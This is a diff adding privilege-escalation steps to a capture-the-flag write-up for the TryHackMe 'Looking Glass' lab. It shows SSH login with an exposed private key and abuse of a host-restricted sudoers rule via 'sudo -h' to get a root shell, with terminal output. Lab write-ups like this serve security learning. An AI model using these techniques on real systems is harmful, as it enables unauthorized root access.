@@ -1,4 +1,4 @@
-# 48 - Looking Glass
+# 48 - Looking Glass (sudoer's file rules for users)
 
 Room Link --> [https://tryhackme.com/room/lookingglass](https://tryhackme.com/room/lookingglass)
 
@@ -196,17 +196,39 @@ I just paste them into cyberchef and convert from Hex.
 
 `su humptydumpty` - and we are humptydumpty.
 
+### Priv Esc to Alice
 
+Although we don't have access to list anything in alice home dir, but we can see that Alice's `.ssh` folder is available, and we can also access the Private keys.
 
+<figure><img src=".gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>
 
+Use the priv key to gain login ssh acct for Alice.
 
+<figure><img src=".gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>
 
+### Priv Esc to Tryhackme
 
+Running LinPEAS.sh we found an interesting sudoers file rule for alice.
 
+<figure><img src=".gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>
 
+The following is the syntax used by the Sudoers files, which means alice can run /bin/bash as root, but only on the “ssalg-gnikool” host.
 
+<figure><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/07/image-365.png?w=800&#x26;ssl=1" alt=""><figcaption></figcaption></figure>
 
+The -h flag can be used to specify the host when executing commands with Sudo:
 
+`sudo -h ssalg-gnikool -u root /bin/bash` - and we are root.
 
+```bash
+alice@looking-glass:/etc/sudoers.d$ cat alice 
+alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
+alice@looking-glass:/etc/sudoers.d$ sudo -h ssalg-gnikool -u root /bin/bash
+sudo: unable to resolve host ssalg-gnikool
+root@looking-glass:/etc/sudoers.d# cd /root/
+root@looking-glass:/root# ls 
+passwords  passwords.sh  root.txt  the_end.txt
+```
 
+Done!
 
